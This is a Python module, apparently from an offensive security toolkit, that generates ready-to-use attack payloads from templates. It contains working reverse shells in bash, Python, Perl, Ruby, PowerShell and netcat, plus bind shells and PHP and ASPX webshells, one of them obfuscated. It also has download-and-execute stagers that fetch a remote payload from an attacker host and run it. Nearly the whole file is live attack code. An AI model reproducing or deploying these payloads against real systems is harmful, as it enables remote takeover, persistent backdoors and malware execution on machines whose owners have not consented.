"""
Payload Generation Module.

Generates shellcode, reverse shells, webshells, and bind shells
in multiple languages with optional encoding/obfuscation.
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional


class PayloadLanguage(Enum):
    BASH = "bash"
    PYTHON = "python"
    PERL = "perl"
    RUBY = "ruby"
    POWERSHELL = "powershell"
    NETCAT = "netcat"
    PHP = "php"
    ASPX = "aspx"
    JAVA = "java"


class PayloadType(Enum):
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    WEBSHELL = "webshell"
    DOWNLOAD_EXEC = "download_exec"


@dataclass
class GeneratedPayload:
    payload_type: PayloadType
    language: PayloadLanguage
    code: str
    description: str
    lhost: str = ""
    lport: int = 0
    rport: int = 0

    def to_dict(self) -> Dict:
        return {
            "type": self.payload_type.value,
            "language": self.language.value,
            "code": self.code,
            "description": self.description,
            "lhost": self.lhost,
            "lport": self.lport,
            "rport": self.rport,
        }


SHELL_TEMPLATES: Dict[str, Dict[str, str]] = {
    "reverse_shell": {
        "bash": 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
        "python": (
            "import socket,subprocess,os\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.connect(('{LHOST}',{LPORT}))\n"
            "os.dup2(s.fileno(),0)\n"
            "os.dup2(s.fileno(),1)\n"
            "os.dup2(s.fileno(),2)\n"
            "subprocess.call(['/bin/sh','-i'])"
        ),
        "perl": (
            "use Socket;\n"
            "$i='{LHOST}';\n"
            "$p={LPORT};\n"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));\n"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){{\n"
            "  open(STDIN,'>&S');\n"
            "  open(STDOUT,'>&S');\n"
            "  open(STDERR,'>&S');\n"
            "  exec('/bin/sh -i');\n"
            "}}"
        ),
        "ruby": (
            "require 'socket'\n"
            "c=TCPSocket.new('{LHOST}',{LPORT})\n"
            "$stdin.reopen(c)\n"
            "$stdout.reopen(c)\n"
            "$stderr.reopen(c)\n"
            "$stdin.each_line{{|l|system(l)}}"
        ),
        "powershell": (
            "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});\n"
            "$stream = $client.GetStream();\n"
            "[byte[]]$bytes = 0..65535|%{{0}};\n"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{\n"
            "  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n"
            "  $sendback = (iex $data 2>&1 | Out-String );\n"
            "  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n"
            "  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n"
            "  $stream.Write($sendbyte,0,$sendbyte.Length);\n"
            "  $stream.Flush()\n"
            "}};\n"
            "$client.Close()"
        ),
        "netcat": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    },
    "bind_shell": {
        "python": (
            "import socket,subprocess\n"
            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
            "s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
            "s.bind(('0.0.0.0',{RPORT}))\n"
            "s.listen(1)\n"
            "conn,addr=s.accept()\n"
            "while True:\n"
            "  data=conn.recv(1024)\n"
            "  if not data: break\n"
            "  conn.send(subprocess.check_output(data,shell=True))"
        ),
        "bash": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l -p {RPORT} >/tmp/f",
        "netcat": "nc -lvnp {RPORT} -e /bin/sh",
    },
    "webshell": {
        "php": '<?php system($_GET["cmd"]); ?>',
        "aspx": (
            '<%@ Page Language="C#" %>\n'
            '<%@ Import Namespace="System.Diagnostics" %>\n'
            '<script runat="server">\n'
            "protected void Page_Load(object sender, EventArgs e) {{\n"
            '  string cmd = Request.QueryString["cmd"];\n'
            "  if (!string.IsNullOrEmpty(cmd)) {{\n"
            "    Process p = new Process();\n"
            "    p.StartInfo.FileName = \"cmd.exe\";\n"
            '    p.StartInfo.Arguments = "/c \" + cmd;\n'
            "    p.StartInfo.UseShellExecute = false;\n"
            "    p.StartInfo.RedirectStandardOutput = true;\n"
            "    p.Start();\n"
            "    Response.Write(p.StandardOutput.ReadToEnd());\n"
            "  }}\n"
            "}}\n"
            '</script>'
        ),
        "php_simple": '<?=`$_GET["cmd"]`;?>',
        "php_obfuscated": (
            "<?php\n"
            "$_ = \"Y29kZQ==\";\n"
            "$__ = \"cmd\";\n"
            "$___ = \"system\";\n"
            "$____ = $_POST[$__];\n"
            "$___($____);\n"
            "?>"
        ),
    },
    "download_exec": {
        "python": (
            "import urllib.request,subprocess\n"
            "url='{LHOST}/payload'\n"
            "data=urllib.request.urlopen(url).read()\n"
            "open('/tmp/payload','wb').write(data)\n"
            "subprocess.call(['chmod','+x','/tmp/payload'])\n"
            "subprocess.call(['/tmp/payload'])"
        ),
        "bash": "curl -s {LHOST}/payload -o /tmp/payload && chmod +x /tmp/payload && /tmp/payload",
        "powershell": (
            "(New-Object System.Net.WebClient).DownloadFile('{LHOST}/payload', "
            "'$env:TEMP\\payload.exe'); Start-Process '$env:TEMP\\payload.exe'"
        ),
    },
}


class PayloadGenerator:
    """
    Generates payload code for various languages and types.

    Supports:
    - Reverse shells (bash, python, perl, ruby, powershell, netcat)
    - Bind shells (python, bash, netcat)
    - Webshells (php, aspx)
    - Download & execute stagers
    """

    def generate(
        self,
        payload_type: PayloadType,
        language: PayloadLanguage,
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        rport: int = 4444,
    ) -> GeneratedPayload:
        type_key = payload_type.value
        lang_key = language.value

        templates = SHELL_TEMPLATES.get(type_key, {})
        template = templates.get(lang_key, "")

        if not template and lang_key == "php":
            template = SHELL_TEMPLATES.get(type_key, {}).get("php", "")
            language = PayloadLanguage.PHP

        if not template:
            available = list(templates.keys())
            fallback = available[0] if available else "python"
            template = SHELL_TEMPLATES.get(type_key, {}).get(fallback, "")
            language = PayloadLanguage(fallback)

        code = template.replace("{LHOST}", lhost).replace("{LPORT}", str(lport)).replace("{RPORT}", str(rport))

        desc_map = {
            PayloadType.REVERSE_SHELL: f"Reverse shell to {lhost}:{lport}",
            PayloadType.BIND_SHELL: f"Bind shell on port {rport}",
            PayloadType.WEBSHELL: "PHP web shell with cmd parameter",
            PayloadType.DOWNLOAD_EXEC: f"Download and execute payload from {lhost}",
        }

        return GeneratedPayload(
            payload_type=payload_type,
            language=language,
            code=code,
            description=desc_map.get(payload_type, ""),
            lhost=lhost,
            lport=lport,
            rport=rport,
        )

    def generate_chain(self, lhost: str = "127.0.0.1", lport: int = 4444) -> List[GeneratedPayload]:
        payloads: List[GeneratedPayload] = []

        for lang in PayloadLanguage:
            if lang == PayloadLanguage.ASPX:
                continue
            try:
                p = self.generate(PayloadType.REVERSE_SHELL, lang, lhost, lport)
                payloads.append(p)
            except (KeyError, ValueError):
                continue

        return payloads

    def list_available(self) -> Dict[str, List[str]]:
        result: Dict[str, List[str]] = {}
        for ptype in PayloadType:
            key = ptype.value
            templates = SHELL_TEMPLATES.get(key, {})
            result[key] = list(templates.keys())
        return result
